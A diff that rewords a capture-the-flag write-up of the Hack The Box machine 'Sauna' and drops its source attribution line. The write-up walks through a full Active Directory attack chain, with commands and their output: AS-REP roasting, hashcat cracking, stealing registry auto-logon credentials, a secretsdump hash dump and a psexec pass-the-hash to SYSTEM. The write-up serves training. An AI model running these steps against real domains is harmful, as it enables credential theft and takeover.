@@ -6,12 +6,12 @@ points: 20
 rating: 4.5
 date: 2020-02-15
 avatar: assets/htb/sauna.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Sauna
 ---
+
 ## Overview
 
-A fairly easy Windows machine that requires a little 'outside the box' thinking in order to get the initial foothold.  After that, simple enumeration will give everything else that is needed.
+A relatively straightforward Windows box where the only real challenge is some lateral thinking to land the initial foothold. Once you're in, basic enumeration hands you the rest.
 
 ## Useful Skills and Tools
 
@@ -19,39 +19,39 @@ A fairly easy Windows machine that requires a little 'outside the box' thinking 
 
 #### psexec.py
 
-* You can use `psexec` to pass-the-\(NT\)hash to get system privileges.  A valid administrator account username and hash are needed.
+* `psexec` lets you pass-the-\(NT\)hash to obtain system-level access. You'll need a valid administrator username along with its hash.
 * `sudo python3 psexec.py -hashes :<password_hash> Administrator@<YOUR_IP>` 
 
 #### secretsdump.py
 
-* Use this to dump password hashes from `NTDS.DIT` from a domain server.  Requires valid user credentials.  
+* This pulls password hashes out of `NTDS.DIT` on a domain server. Valid user credentials are required.  
 * `python3 ./secretsdump.py <domain_name>/<username>@<YOUR_IP>` 
-* Adding the flag `-just-dc-ntlm` will make it dump only the Lanman and NT hashes.
+* Supplying the `-just-dc-ntlm` flag limits the dump to just the Lanman and NT hashes.
 
 #### GetNPUsers.py
 
-* Extracts the Kerberos `krb5asrep` hashes for users from the domain controller.  This requires a valid `DOMAINNAME/username` pair to run.  Will only extract hashes for users that do not require Kerberos pre-authentication. 
+* Grabs the Kerberos `krb5asrep` hashes for domain users from the domain controller. A valid `DOMAINNAME/username` pair is needed to run it. Only users without Kerberos pre-authentication enabled will yield hashes. 
 * `python3 GetNPUsers.py -outputfile <out_file> -format hashcat -usersfile <username_file> -no-pass -dc-ip <YOUR_IP> <domain_name>/<user_name>`
-* In this example the output will be in hashcat format.
+* Here the output is written in hashcat format.
 
 ### Extracting Windows Auto-logon credentials with `reg query`
 
-The command `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` will output any stored Windows Auto-logon credentials.
+Running `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` reveals any Windows Auto-logon credentials that have been saved.
 
 ### Using `hashcat` to crack Kerberos hashes
 
-* In order to crack `krb5asrep` type hashes the `-m 18200` option is needed.
+* Cracking `krb5asrep` type hashes requires the `-m 18200` option.
 * `hashcat -m 18200 -a 0 <input_file> <wordlist> --force`
 
 ### Enumerating valid usernames through `kerberos` using MetaSploit
 
-In the Metasploit console the `auxiliary(gather/kerberos_enumusers)` tool enumerates valid users against Kerberos from a list.  This scanner also checks if each user has "pre-auth required" enabled.
+From the Metasploit console, the `auxiliary(gather/kerberos_enumusers)` module takes a list and enumerates which users are valid against Kerberos. It also reports whether each user has "pre-auth required" turned on.
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`which is a shortcut which tells nmap to scan all ports, `-sC`  is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN`  saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan of `<YOUR_IP>`. My usual flags are: `-p-`, a shortcut telling nmap to cover every port; `-sC`, which is the same as `--script=default` and fires off a set of nmap enumeration scripts at the target; `-sV` for a service scan; and `-oN`, which writes the results to a file named `<name>`.
 
 ```text
 kac0@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap <YOUR_IP>
@@ -125,7 +125,7 @@ Final times for host: srtt: 137789 rttvar: 1734  to: 144725
 Nmap done: 1 IP address (1 host up) scanned in 553.41 seconds
 ```
 
-Lots of ports were open on this machine! Based on the plethora of related ports, it was fairly easy to guess that this machine was a Windows-based domain server.  
+This box had a ton of open ports! With so many related services exposed, it was pretty clear right away that this was a Windows domain server.  
 
 ### ldapsearch enumeration
 
@@ -217,17 +217,17 @@ dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
 dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
 ```
 
-Hmm... not much to go off from LDAP, though I was able to find one potential user named Hugo Smith \(unfortunately there was no Windows username to go with it.\)
+Hmm... LDAP didn't give me much, though I did turn up one possible user, Hugo Smith \(sadly with no Windows username attached to it.\)
 
 ### Egotistical Bank website
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-egobank.png)
+![](assets/wu/sauna/img-1.png)
 
-On port 80 I found a website hosted for Egotistical Bank.  Most of this site consisted of template pages with lots of lorem ipsum paragraphs and very little information.  One page caught my eye, however.
+Port 80 served up a website for Egotistical Bank. The bulk of it was boilerplate template pages padded with lorem ipsum and almost no real content. One page, though, stood out.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-possible-users.png)
+![](assets/wu/sauna/img-2.png)
 
-I found a list of potential users on the 'About Us' page under the "Meet The Team" heading.  Since these were potentially employees at Egotistical Bank I used some common username formats to turn these names into potential usernames, then proceeded to test if any of them were valid.  
+The 'About Us' page had a list of names under the "Meet The Team" heading. Assuming these were Egotistical Bank employees, I ran the names through several common username conventions to build candidate usernames, then set about checking which ones were valid.  
 
 ```text
 hugos
@@ -253,13 +253,13 @@ fergus.smith
 fsmith
 ```
 
-This was my list of possible usernames based on common business formats I have seen in the past.  There was also one user's name \(Hugo Smith\) that I had gotten from from `ldapsearch` that was not on the website, so I added it to the list as well.
+That gave me a list of candidate usernames derived from typical corporate naming schemes I've come across before. I also tacked on the one name \(Hugo Smith\) that `ldapsearch` had surfaced but which wasn't listed on the website.
 
 ## Road to User
 
 ### Finding user creds
 
-Finding user credentials was pretty fast and straightforward for this machine, despite not having a lot of information to go on. I used my list of potential usernames and used the Metasploit module `auxiliary/gather/kerberos_enumusers` to check if any of these usernames were valid, and if they had Kerberos pre-authentication turned off. This setting is a security feature of Kerberos which gives protection against password-guessing brute force attacks.
+Even with limited information, grabbing user credentials on this box turned out to be quick and easy. Feeding my candidate username list into the Metasploit module `auxiliary/gather/kerberos_enumusers`, I checked which usernames were valid and which had Kerberos pre-authentication disabled. That pre-auth setting is a Kerberos security feature meant to defend against password-guessing brute force attacks.
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
@@ -272,7 +272,7 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 [+] <YOUR_IP>:88 - User: "hsmith" is present
 ```
 
-After running this scan, I only got back one hit for a valid username `hsmith`. I now had a valid username and the business format for other potential usernames . One oddity I noticed: the scan would crash Metasploit for some reason when it got to the name `fsmith` \(_I tried this multiple times with and without that name to be sure_\). I kept this username on the possibly valid list just in case.
+The scan came back with just a single valid username, `hsmith`. That confirmed both a working username and the naming convention used for the others. One strange thing stood out: the scan kept crashing Metasploit whenever it reached `fsmith` \(_I repeated this several times, with and without that name, to confirm_\). I left `fsmith` on the maybe-valid list to be safe.
 
 ```text
 kac0@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/kac0/htb/sauna/users -no-pass -dc-ip <YOUR_IP> EGOTISTICALBANK/hsmith
@@ -285,21 +285,19 @@ kac0@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
 
-Since `fsmith` crashed Metasploit I was hoping that it was because there was something in the output that it didn't understand. I decided to use another script that would give the same information to me, but would also dump the Kerberos hashes for any users who did not require the pre-authentication check. I used the `GetNPUsers.py` tool from the Impacket python examples collection to try to get the `krb5asrep` hashes using . In order to pull these hashes you need a valid username in the format `DOMAINNAME/username`. Luckily I had the domain name from my early enumeration and a valid username that Metasploit had gotten from the domain controller. I set my output to be saved in hashcat format so I could use that tool to try to quickly crack the hash.
+Because `fsmith` was crashing Metasploit, I suspected the tool was choking on something in that user's output. So I switched to a different script that returns the same data but additionally dumps the Kerberos hashes of any users without the pre-authentication requirement. I reached for `GetNPUsers.py` from the Impacket python examples to try pulling the `krb5asrep` hashes. Pulling those hashes requires a valid username in `DOMAINNAME/username` form. Fortunately I already had the domain name from my earlier enumeration plus a valid username Metasploit had pulled from the domain controller. I told it to write the output in hashcat format so I could quickly crack the hash with that tool.
 
-At first I thought that I was just getting back the same results as the Metasploit module until I counted the number of names that it was outputting results for. I realized that there was one result unaccounted for so I looked in the output directory and opened my output file `sauna.hash`to see if I had gotten any hits.  
+Initially I assumed I was only seeing the same results the Metasploit module gave me, until I tallied up how many names had output. There was one extra result I couldn't account for, so I checked the output directory and opened `sauna.hash` to see whether I'd landed any hits.  
 
 ```text
 $krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d10168e316be0713c91cb16$422f07d5f637adc6c396d1999bca49283f7f24c0257ead111b9adf94c623a7247e8e7575905e1ed3978dbce3a7a2b2d293d7339bc80dd2df4154ac019f614809aed59536842505f726e48a0119a18c3bc66d31cfe424269592b558e2ffdd616e36b1f8fccb6e4e16c8a0d9c1b9b668db776d4c46a1fa2d5cd00e2a00c59f218425690286f2bb95b4336ae1edea8def1d3da3ebd1c496da4664c1ce6299b0370dd87219b23243ce47fd1272dd5e1f084305cf1732ce7c5084727a9199935b2bcb3198c17e3d84d339611150501ccf17ae4f16e4784172da981623ac96f14bfbf17cf4afb8df652c089e363f2f07562703db74106bd22179dd37
 ```
 
-It contained the Kerberos hash for the user `fsmith`! I had been right in my hunch that it was still a valid username despite the odd Metasploit behavior earlier. 
+Sure enough, it held the Kerberos hash for `fsmith`! My hunch had paid off, `fsmith` was a valid username after all, despite Metasploit's earlier weirdness. 
 
-{% hint style="info" %}
-I am not sure why `GetNPUsers.py` doesn't inform you when it finds a valid user and gets the hash, so pay attention to your output files! 
-{% endhint %}
+I'm not sure why `GetNPUsers.py` doesn't tell you when it locates a valid user and captures the hash, so keep an eye on your output files! 
 
-Next I fired up `hashcat` to try to crack the password hash.  The option `-m 18200` is the flag which tells `hashcat` that this is a `krb5asrep` type hash and `-a 0` makes it use the words straight from the specified wordlist without any mangling rules applied.
+Next I launched `hashcat` to crack the password hash. The `-m 18200` flag tells `hashcat` the input is a `krb5asrep` hash, while `-a 0` makes it try the words from the supplied wordlist as-is, with no mangling rules.
 
 ```text
 kac0@kalimaa:~/htb/sauna$ hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force
@@ -333,11 +331,11 @@ Started: Tue Jun  2 16:13:42 2020
 Stopped: Tue Jun  2 16:15:18 2020
 ```
 
-Including the time spent building the dictionary file and getting everything loaded, this hash took less than two minutes to be cracked using `hashcat`. The password for `fmsith` was apparently `Thestrokes23` \(to see it in the output above you have to scroll all the way to the right...the output shows it at the end of the hash string\).
+Even counting the time to build the dictionary and load everything up, `hashcat` cracked this hash in under two minutes. The password for `fmsith` turned out to be `Thestrokes23` \(to spot it in the output above you have to scroll all the way right...it appears tacked onto the end of the hash string\).
 
 ### User.txt
 
-Now that I had a username and password, I could try to log into the server using `evil-winrm`.  This tool connects to the Windows Remote Management service that is usually open on port 5985.
+With a username and password in hand, I could attempt a login via `evil-winrm`. This tool talks to the Windows Remote Management service, which typically listens on port 5985.
 
 ```text
 kac0@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u fsmith 
@@ -389,7 +387,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\FSmith\Documents>
 ```
 
-Luckily for me `fsmith` was a member of the `Remote Management Users` group and I was able to log in.  Next I collected my hard-earned loot.
+Lucky for me, `fsmith` belonged to the `Remote Management Users` group, so the login succeeded. With that, I went and grabbed my hard-earned loot.
 
 ```text
 *Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
@@ -400,7 +398,7 @@ Luckily for me `fsmith` was a member of the `Remote Management Users` group and 
 
 ### Enumeration as User `fsmith`
 
-After running the command `whoami /all` my next step when gaining access as a new user is to try to do as much enumeration as possible.  The Windows Privilege Escalation Awesome Scripts \([Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\) tool is a collection of scripts that make this enumeration extremely simple.  In this case, it made moving laterally to another user very easy to complete.  
+After `whoami /all`, my standard move upon landing as a new user is to enumerate everything I can. The Windows Privilege Escalation Awesome Scripts \([Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\) suite bundles a set of scripts that make this enumeration trivially easy. Here, it made pivoting to another user a breeze.  
 
 ```text
 --Cut from WinPEAS.exe--
@@ -422,7 +420,7 @@ C:\Windows\System32\OpenSSH\
     C:\Users\svc_loanmgr
 ```
 
-Auto-logon is a terrible, terrible service that should never be used, but makes it convenient for users when they are the only ones who use a computer. As the name implies, Windows will automatically log the user on by caching their credentials.  I verified this output by looking up the registry key where this information is stored using the `reg query` command.  Auto-logon credentials are stored in the key`HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon`.  
+Auto-logon is an awful service that really shouldn't ever be enabled, but it's convenient for someone who's the sole user of a machine. True to its name, Windows logs the user in automatically by caching their credentials. I confirmed WinPEAS's finding by querying the registry key that holds this data with `reg query`. The auto-logon credentials live in the key `HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon`.  
 
 ```text
 *Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -461,7 +459,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     DefaultPassword    REG_SZ    Moneymakestheworldgoround!
 ```
 
-For some reason there was a discrepancy between the username of the account that had auto-logon enabled \(`svc_loanmanager`\), and the account that had a user folder on the machine \(`svc_loanmgr`\).  I decided to try logging in using `svc_loanmgr` since that was the name of the user's folder.
+Oddly, the account name with auto-logon enabled \(`svc_loanmanager`\) didn't match the account that actually had a user folder on the box \(`svc_loanmgr`\). I opted to log in as `svc_loanmgr`, since that matched the folder name.
 
 ### Moving laterally to user `svc_loanmgr`
 
@@ -514,7 +512,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-If you have credentials you can use Impacket's `secretsdump.py` to try to dump password hashes. These hashes can then be used to either crack and retrieve the passwords or in a pass-the-hash attack.  
+When you hold credentials, Impacket's `secretsdump.py` can be used to dump password hashes. Those hashes can then either be cracked to recover the plaintext passwords or used directly in a pass-the-hash attack.  
 
 ```text
 kac0@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@<YOUR_IP>
@@ -533,11 +531,11 @@ SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:21e6b7db7208776337bf12e6c910a32d:::
 [*] Cleaning up...
 ```
 
-After successfully extracting the password hash for the `Administrator` account I decided to practice doing a pass-the-hash attack \(I didn't attempt to crack the hashes to extract the passwords so I cannot say how long it might take!\).
+Having pulled the `Administrator` account's password hash, I decided to practice a pass-the-hash attack \(I never tried cracking the hashes for the plaintext passwords, so I can't say how long that would take!\).
 
 ### Getting a shell
 
-The blog at [https://en.hackndo.com/pass-the-hash/](https://en.hackndo.com/pass-the-hash/) has a nice write-up on how and why pass-the-hash attacks work.  I used the `psexec.py` tool from Impacket's examples, though there are many tools for doing this attack against Windows.  
+There's a solid write-up on how and why pass-the-hash attacks work over at [https://en.hackndo.com/pass-the-hash/](https://en.hackndo.com/pass-the-hash/). I went with Impacket's `psexec.py`, although plenty of other tools can carry out this attack against Windows.  
 
 ```text
 kac0@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@<YOUR_IP>
@@ -557,11 +555,11 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-Not only did this tool log me in, but it also elevated my privilege to `nt authority\system`!
+This tool not only logged me in, it also handed me `nt authority\system` privileges!
 
 ### Root.txt
 
-The final thing to do after gaining full control over this machine was to get my proof. 
+With full control of the machine, the last step was to grab my proof. 
 
 ```text
 C:\Windows\system32>cat C:\users\administrator\desktop\root.txt
